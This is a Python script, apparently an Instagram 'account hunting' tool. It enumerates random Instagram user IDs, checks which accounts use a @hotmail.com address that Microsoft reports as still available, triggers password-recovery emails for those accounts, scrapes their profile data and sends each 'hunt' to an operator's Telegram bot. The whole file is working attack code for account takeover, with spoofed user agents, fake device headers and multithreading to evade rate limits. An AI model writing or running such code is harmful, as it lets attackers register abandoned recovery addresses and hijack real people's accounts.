import requests,secrets,random,os
from faker import Faker
from threading import Thread
import sys

ids=[]

######L7N#####
R = '\033[1;31;40m'
X = '\033[1;33;40m' 
F = '\033[1;32;40m' 
C = "\033[1;97;40m" 
C = "\033[1;97;40m"
B = '\033[1;36;40m'
K = '\033[1;35;40m'
V = '\033[1;36;40m'
######L7N#####
good_hot,bad_hot,good_ig,bad_ig,check,mj=0,0,0,0,0,0
tok = input('• {}TOKEN{} ♪ {}TELE : {}'.format(B,C,V,K))
print("\r")
iD = input('• {}ID{} ♪ {}TELE : {}'.format(B,C,V,K))
os.system('clear')
def cookie():
	try:
	   url = 'https://signup.live.com'
	   headers={'user-agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36'}
	   response = requests.post(url,headers=headers)
	   amsc = response.cookies.get_dict()['amsc']
	   canary = str.encode(response.text.split('Canary')[4].split('","ip":"')[0].split('":"')[1]).decode("unicode_escape").encode("ascii").decode("unicode_escape").encode("ascii").decode("ascii")
	   return amsc,canary
	except requests.exceptions.ConnectionError:
		cookie()

def insta1(email):
	global good_ig,bad_ig
	try:
		app=''.join(random.choice('1234567890')for i in range(15))
		response = requests.get('https://www.instagram.com/api/graphql')
		csrf = response.cookies.get_dict().get('csrftoken')
		rnd=str(random.randint(150, 999))
		user_agent = "Instagram 311.0.0.32.118 Android (" + ["23/6.0", "24/7.0", "25/7.1.1", "26/8.0", "27/8.1", "28/9.0"][random.randint(0, 5)] + "; " + str(random.randint(100, 1300)) + "dpi; " + str(random.randint(200, 2000)) + "x" + str(random.randint(200, 2000)) + "; " + ["SAMSUNG", "HUAWEI", "LGE/lge", "HTC", "ASUS", "ZTE", "ONEPLUS", "XIAOMI", "OPPO", "VIVO", "SONY", "REALME"][random.randint(0, 11)] + "; SM-T" + rnd + "; SM-T" + rnd + "; qcom; en_US; 545986"+str(random.randint(111,999))+")"
		common_data = {'flow': 'fxcal','recaptcha_challenge_field': '',}
		data = {'email_or_username': email + "@hotmail.com", **common_data}
		headers = {'authority': 'www.instagram.com','accept': '*/*','accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7','content-type': 'application/x-www-form-urlencoded','user-agent': user_agent,'viewport-width': '384','x-asbd-id': '129477','x-csrftoken': f'{csrf}','x-ig-app-id': app,'x-ig-www-claim': '0','x-instagram-ajax': '1007832499','x-requested-with': 'XMLHttpRequest'}
		response = requests.post('https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/', headers=headers, data=data)
		if 'email_or_sms_sen' in response.text :
			good_ig+=1			
			check_hot(email)
		else:
			bad_ig+=1			
	except requests.exceptions.ConnectionError:
		insta1(email)

def insta2(email):
	bb =0
	global good_ig,bad_ig
	try:
		rnd=str(random.randint(150, 999))
		user_agent = "Instagram 311.0.0.32.118 Android (" + ["23/6.0", "24/7.0", "25/7.1.1", "26/8.0", "27/8.1", "28/9.0"][random.randint(0, 5)] + "; " + str(random.randint(100, 1300)) + "dpi; " + str(random.randint(200, 2000)) + "x" + str(random.randint(200, 2000)) + "; " + ["SAMSUNG", "HUAWEI", "LGE/lge", "HTC", "ASUS", "ZTE", "ONEPLUS", "XIAOMI", "OPPO", "VIVO", "SONY", "REALME"][random.randint(0, 11)] + "; SM-T" + rnd + "; SM-T" + rnd + "; qcom; en_US; 545986"+str(random.randint(111,999))+")"
		url = 'https://www.instagram.com/api/v1/web/accounts/check_email/'
		head= {	
			 'Host': 'www.instagram.com',
			 'origin': 'https://www.instagram.com',
			 'referer': 'https://www.instagram.com/accounts/signup/email/',	
			 'sec-ch-ua-full-version-list': '"Android WebView";v="119.0.6045.163", "Chromium";v="119.0.6045.163", "Not?A_Brand";v="24.0.0.0"',
			 'user-agent': user_agent}
		data = {
		'email':email+"@hotmail.com"
		}
		re= requests.post(url,headers=head,data=data).text
		if 'email_is_taken' in re:		
			good_ig+=1			
			check_hot(email)
		else:
			bad_ig+=1			
	except requests.exceptions.ConnectionError:
		insta2(email)

def check_hot(email):
	global good_hot,bad_hot
	versions = ["13.1.2", "13.1.1", "13.0.5", "12.1.2", "12.0.3"]
	os = ["Macintosh; Intel Mac OS X 10_15_7", "Macintosh; Intel Mac OS X 10_14_6", "iPhone; CPU iPhone OS 14_0 like Mac OS X", "iPhone; CPU iPhone OS 13_6 like Mac OS X"]
	version = random.choice(versions)
	platform = random.choice(os)
	user_agent = f"Mozilla/5.0 ({platform}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{version} Safari/605.1.15 Edg/122.0.0.0"
	try:	     
	     amsc,canary = cookie()	     
	     headers = {
      'authority': 'signup.live.com',
      'accept': 'application/json',
      'accept-language': 'en-US,en;q=0.9',
      'canary': canary,
      'user-agent': user_agent,
    }
	     cookies = {
      'amsc':amsc
    }
	     data = {
      'signInName': email+"@hotmail.com",
    }
	     response = requests.post(
      'https://signup.live.com/API/CheckAvailableSigninNames',cookies=cookies,headers=headers,json=data)	     
	     if 'isAvailable' in response.text:	     	
	     	hunting(email)
	     	good_hot+=1
	     else:
	     	bad_hot+=1	     	
	except requests.exceptions.ConnectionError:
		check_hot(email)	

def hunting(email):
	try:
		headers = {
    'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
    'X-Pigeon-Rawclienttime': '1700251574.982',
    'X-IG-Connection-Speed': '-1kbps',
    'X-IG-Bandwidth-Speed-KBPS': '-1.000',
    'X-IG-Bandwidth-TotalBytes-B': '0',
    'X-IG-Bandwidth-TotalTime-MS': '0',
    'X-Bloks-Version-Id': '009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
    'X-IG-Connection-Type': 'WIFI',
    'X-IG-Capabilities': '3brTvw==',
    'X-IG-App-ID': '567067343352427',
    'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
    'Accept-Language': 'en-GB, en-US',
     'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Accept-Encoding': 'gzip, deflate',
    'Host': 'i.instagram.com',
    'X-FB-HTTP-Engine': 'Liger',
    'Connection': 'keep-alive',
    'Content-Length': '356',
}
		data = {
    'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"'+email+'"}',
    'ig_sig_key_version': '4',
}
		response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',headers=headers,data=data,)
		try:
			rest = response.json()['email']
		except requests.exceptions.ConnectionError:
			rest = False
		try:
			info=requests.get('https://anonyig.com/api/ig/userInfoByUsername/'+email).json()
		except requests.exceptions.ConnectionError:
			info = None			
		try:
			Id =info['result']['user']['pk_id']
		except requests.exceptions.ConnectionError:
			Id = None
		try:
			followers = info['result']['user']['follower_count']
		except requests.exceptions.ConnectionError:
			followers = None
		try:
			following = info['result']['user']['following_count']
		except requests.exceptions.ConnectionError:
			following = None
		try:
			post = info['result']['user']['media_count']
		except requests.exceptions.ConnectionError:
			post = None
		try:
			name = info['result']['user']['full_name']
		except requests.exceptions.ConnectionError:
			name = None
		try:
			api = 'https://alanygetdata-cb237e0c369e.herokuapp.com/'
			params = {'id':Id}
			responses = requests.get(api,params=params).json()
			date = responses["date"]
		except requests.exceptions.ConnectionError:
			date = None	
		requests.post(f"""https://api.telegram.org/bot{tok}/sendvideo?chat_id={iD}&parse_mode=MarkdownV2&video=https://t.me/yyyyyy3w/15&caption=*• 𝙝𝙚𝙡𝙡 𝙞𝙨 𝙘𝙤𝙢𝙞𝙣𝙜 
• ||𝙙𝙤𝙣𝙩 𝙩𝙧𝙮 𝙖𝙜𝙖𝙞𝙣 , 𝙞𝙢 𝙩𝙝𝙚 𝙗𝙚𝙨𝙩 ⚡||*
""")	
		hunt = ("""
𝙣𝙚𝙬 𝙝𝙪𝙣𝙩 𝙗𝙧𝙤 𝙜𝙤𝙤𝙙 𝙡𝙪𝙘𝙠 🐉
⋘━─━𓆩𝐋7𝐍𓆪‌‏━─━⋙ 
𝙣𝙖𝙢𝙚 : {}
𝙪𝙨𝙚𝙧𝙣𝙖𝙢𝙚 : {}
𝙚𝙢𝙖𝙞𝙡 : {}@hotmail.com
𝙛𝙤𝙡𝙡𝙤𝙬𝙚𝙧𝙨 : {}
𝙛𝙤𝙡𝙡𝙤𝙬𝙞𝙣𝙜 : {}
𝙞𝙙 : {}
𝙙𝙖𝙩𝙚 : {}
𝙥𝙤𝙨𝙩 : {}
𝙧𝙚𝙨𝙚𝙩 : {}
⋘━─━𓆩𝐋7𝐍𓆪‌‏━─━⋙ 
𝙗𝙮 : @g_4_q 
		
		""".format(name,email,email,followers,following,Id,date,post,rest))
		requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={iD}&text="+str(hunt))
	except requests.exceptions.ConnectionError:
		hunting(email)

def check_email(email):
	global good_hot,bad_hot,bad_ig,good_ig,check
	Choice = random.choice(['insta1','insta2'])
	if Choice != 'insta2':
		insta1(email)
	else :
		insta2(email)
	b = random.randint(5,208)
	bo = f'\x1b[38;5;{b}m'
	check+=1
	sys.stdout.write(f"\r   {bo}[ {C}𝐋7𝐍 ™ {bo}] {C}Good Hot : {F}{good_hot}  {C}Bad IG : {R}{bad_ig}  {C}Good IG : {X}{good_ig}  {C}{bo}Check•{check}\r")
	sys.stdout.flush()

def uu():  
  re= str(random.randrange(128053904,438909537))
  if re not in ids:
    ids.append(re)
    return re
  else:
    uu()
def username1():
  try:
    while True:
      re=uu()
      csrftoken = secrets.token_hex(32)
      mmidd=secrets.token_hex(27)
      ig_=secrets.token_hex(36)
      datrr=secrets.token_hex(24)
      faker = Faker()
      fak = faker.user_agent()
      app=''.join(random.choice('936619743392459')for i in range(15))
      cookies = {
    'csrftoken': csrftoken,
    'ps_l': '0',
    'ps_n': '0',
    'ig_did': f'{ig_}',
    'ig_nrcb': '1',
    'dpr': '2.1988937854766846',
    'mid': mmidd,
    'datr': datrr,
}

      headers = {
    'authority': 'www.instagram.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'csrftoken=GpSFJXM8cw5Ridi72oRh18; ps_l=0; ps_n=0; ig_did=BFD5A6E1-D993-48EE-914E-A6A5A2CC8D6D; ig_nrcb=1; dpr=2.1988937854766846; mid=ZhLiHgAEAAE63kJS7yz7sG6sp5mw; datr=HuISZrdPWEfDXxhdMTlBClqV',
    'dpr': '2.19889',
    'origin': 'https://www.instagram.com',
    'referer': 'https://www.instagram.com/a_1_in/?igsh=czFtZ3o1aDhraG01',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.2"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-model': '""',
    'sec-ch-ua-platform': '"Linux"',
    'sec-ch-ua-platform-version': '""',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': fak,
    'viewport-width': '891',
    'x-asbd-id': '129477',
    'x-csrftoken': csrftoken,
    'x-fb-friendly-name': 'PolarisProfilePageContentQuery',
    'x-fb-lsd': 'AVoRhvRPoRs',
    'x-ig-app-id': app,
}

      data = {
    'av': '0',
    '__d': 'www',
    '__user': '0',
    '__a': '1',
    '__req': '1',
    '__hs': '19820.HYP:instagram_web_pkg.2.1..0.0',
    'dpr': '2',
    '__ccg': 'UNKNOWN',
    '__rev': '1012604142',
    '__s': 'dmjo05:l5d6wo:20s0u7',
    '__hsi': '7355192092986103751',
    '__dyn': '7xeUjG1mxu1syUbFp40NonwgU29zEdF8aUco2qwJw5ux609vCwjE1xoswaq0yE7i0n24oaEd86a3a1YwBgao6C0Mo2swaO4U2zxe2GewGwso88cobEaU2eUlwhEe87q7U88138bpEbUGdwtU662O0Lo6-3u2WE5B0bK1Iwqo5q1IQp1yUoxe4UrAwCAxW6U',
    'csr': 'gVb2snsIjkIQyjRmBaFGECih59Fb98nQBzbZ2IN8BqBGl7h9Am4ohAAD-vGBh4GizA-4aAiJ2vFDUR3qx596AhrBgzJlBKmu6VHiypryUkByrGiicgPAx6iUpGEOmqfykFA4801kXEkOwmU1Tqwvk8wCix64E0b_EaWdguwozat2F61-wiokxG0d9w2MFU5Kzo0k6wiU7Kut2F601_Ew1me','comet_req': '7','lsd': 'AVoRhvRPoRs',
    'jazoest': '21036',
    '__spin_r': '1012604142',
    '__spin_b': 'trunk',
    '__spin_t': '1712514108',
    'fb_api_caller_class': 'RelayModern',
    'fb_api_req_friendly_name': 'PolarisProfilePageContentQuery',
    'variables': '{"id":"'+re+'","relay_header":false,"render_surface":"PROFILE"}',
    'server_timestamps': 'true',
    'doc_id': '7381344031985950',
}

      response = requests.post('https://www.instagram.com/api/graphql', cookies=cookies, headers=headers, data=data).json()
      okkk = response['data']['user']['username']
      username = okkk
      check_email(username)     	
  except:
   username1()

for i in range(10):
  Thread(target=username1).start()
